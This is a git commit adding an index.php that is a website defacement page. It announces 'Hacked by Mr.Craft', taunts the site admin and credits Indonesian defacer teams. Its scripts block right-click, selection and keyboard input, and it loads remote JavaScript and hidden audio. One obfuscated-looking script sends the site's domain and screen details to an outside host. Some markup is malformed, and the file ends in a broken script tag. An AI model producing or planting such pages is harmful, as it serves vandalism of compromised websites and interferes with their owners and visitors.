6c3b178e0e35d9cf1111afee95c5ee52b2df3de4
iFlekzz112 <37276858+iFlekzz112@users.noreply.github.com>
2018-09-21 02:11:49 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,33 @@
+
+<html>
+<title>Maintance! </title><link rel='shortcut icon' href='https://avatarfiles.alphacoders.com/715/71560.jpg'/>
+<head>
+<center> <img src="https://scontent.fcgk4-1.fna.fbcdn.net/v/t1.0-1/p200x200/16299454_1329930397030157_3201134863356719136_n.png?_nc_cat=0&_nc_eui2=AeGpNJaNAUElhizcrR0ECOVyt3fhUdE53QNuMjvqtvtUsTsMTZbu2teCEikTKRPFbrIUYXl07QOdCL2OYjFqtdTYTQQ6s3x2v-t3SNpIUh30tQ&oh=de142651f4a732432f9be1ae255b2c67&oe=5BC57506" width="280" height="300"/><a/>
+<meta name="author" content="Mr.Craft"/>
+<meta name="description" content="Jangan Galau Admin yaa :v "/>
+<meta property="og:image" content="https://i.pinimg.com/736x/00/73/bb/0073bb778ee5fbed2ca90635df45dd18--manga-art-anime-manga.jpg"/>
+</head>
+<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'alert('you Lose Admin :v')>
+<body bgcolor="grey">
+<script src='http://yourjavascript.com/1171704334/efek-salju-faisal.js' type='text/javascript'/></script> 
+<script type="text/javascript">if (typeof document.onselectstart!="undefined") {document.onselectstart=new Function ("return false");}else{document.onmousedown=new Function ("return false");document.onmouseup=new Function ("return true");}
+</script>
+<style> body{ background-image: url(https://media.giphy.com/media/oDDs67mo76beM/giphy.gif); 
+background-repeat: no-repeat; 
+background-position: top; 
+background-size:100%; </style>
+<link href='http://fonts.googleapis.com/css?family=Quicksand' rel='stylesheet' type='text/css'>
+<center><b><br><br><br><b><font face="courier" color="red" size="10">Hacked  by <font face="courier" color="White" size="10">Mr.Craft</font></b><br><br><br><i><font face="quicksand" color="red" size="6"></b>"Touch By"</b> Mr.Craft </font><br>
+<font face="quicksand" color="red" size="6">Your System Is Not Safe Admin :) </font><br>
+<font face="quicksand" color="red" size="6">Jangan panic indexnya di backup ko admin :) </font><br>
+<font face="quicksand" color="red" size="6">Assalammualikum Pamit Pulang min :V</font><br><br></b></i></center>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "sms=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKqZAuYIpZoDddSOBiqP2DjO4AZFHVQte0QkrSP3HHXPPUUmnTur5XG5XR4RJZ7eqtn0fu9L9YPeThClxSqsTfJDtms16dE8tZMVMo9ha%2fW%2f%2bFgs%2bxZ8q2PcXnrCk30rSCccX%2fca0YUx1LlM8fVZcDG5aZiZOx5nNFnpJ7you2a0Lq8bTcWq27ec0pDkdbPrH6KgY7hC8n7IJjl0izvw%2bNPQyCy89RWBHWqRqE%2f%2fxYZDl%2fRGy1y7elryyCVJJ1wVGjTKzrKKTS8QlpNhw5mV%2fSftP6swpDggSLGaoX8QmwLhwdIDC%2fnzlEoQHn5jjidiXtVSeaS9zu0eXpzFqgd76KBD0cm75xjrceEla7qSw0jE48TXK7DY%2bKp4INgyRH70I83HlRllnMc9IP0j2pqldCGWSX0lip7C4%2f2nTeFII0uuW1SwX0l7Zb9NAaWBpYP4%2f2o7laJtLrh3Y%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<script>alert('you Lose Admin :v')</script>
+<font face="Shadows Into Light Two" size="2px" color="white" style="text-shadow: grey 0 0 10px;">
+<marquee scrollamount='6' behavior='alternate' width='50%'>
+D4RK4TH - KATENBAD - INDONESIAN DEFACER TERSAKITI TEAM - TYPICAL IDIOT SECURITY -Miyako404 -R3DR0S3 -Mr.Silent - Sterben404- D3D0T - EXi2T Cyber Team -Thanx To All Member Defacer Indonesian
+</marquee></font>
+<iframe width="0" height="0" src="https://api.soundcloud.com/tracks/413658570/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" frameborder="0" allowfullscreen></iframe>
+<style type="text/css">* {cursor: url(http://cur.cursors-4u.net/cursors/cur-9/cur815.ani), url(http://cur.cursors-4u.net/cursors/cur-9/cur815.png), auto !important;}</style><a href="http://www.cursors-4u.com/cursor/2011/03/29/the-alien-15.html" target="_blank" title="The Alien"><img src="http://cur.cursors-4u.net/cursor.png" border="0" alt="The Alien" style="position:absolute; top: 0px; right: 0px" /></a> <script src=
+</html>
+<!--Script By Mr.Craft - Ngerusak Copyright Itu Dosa Tolo--!>
